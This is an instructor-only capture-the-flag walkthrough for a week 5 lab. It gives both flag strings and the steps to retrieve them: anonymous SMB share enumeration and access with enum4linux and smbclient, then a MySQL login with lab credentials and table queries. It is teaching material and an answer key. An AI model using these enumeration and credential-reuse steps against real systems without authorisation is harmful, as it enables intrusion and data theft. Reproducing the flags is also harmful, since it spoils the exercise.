# Week 5 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w5_smb_guest_accessed}`)

**Step 1 — Enumerate SMB shares:**
```bash
enum4linux -S 172.50.0.12
# or
smbclient -L //172.50.0.12 -N
```
Output shows a `public` share with guest access.

**Step 2 — Connect and retrieve the flag:**
```bash
smbclient //172.50.0.12/public -N
smb: \> ls
smb: \> get user.txt
smb: \> exit
cat user.txt
```

---

## Flag 2 — root.txt (`flag{w5_mysql_data_exfil}`)

**Step 1 — Connect to MySQL:**
```bash
mysql -h 172.50.0.11 -u dbuser -pdbpass123 corpdb
```

**Step 2 — List all tables:**
```sql
SHOW TABLES;
```
Output shows `employees`, `systems`, and `ctf_flags`.

**Step 3 — Extract the flag:**
```sql
SELECT flag FROM ctf_flags;
```

---

## Teaching Points

- SMB null/guest sessions are a real-world misconfiguration — `enum4linux` and `smbclient -N` are essential enumeration tools
- Databases often contain more tables than documented; `SHOW TABLES` + `SELECT *` on each is standard enumeration practice
- Credentials discovered during enumeration (dbuser/dbpass123) often reuse patterns across services
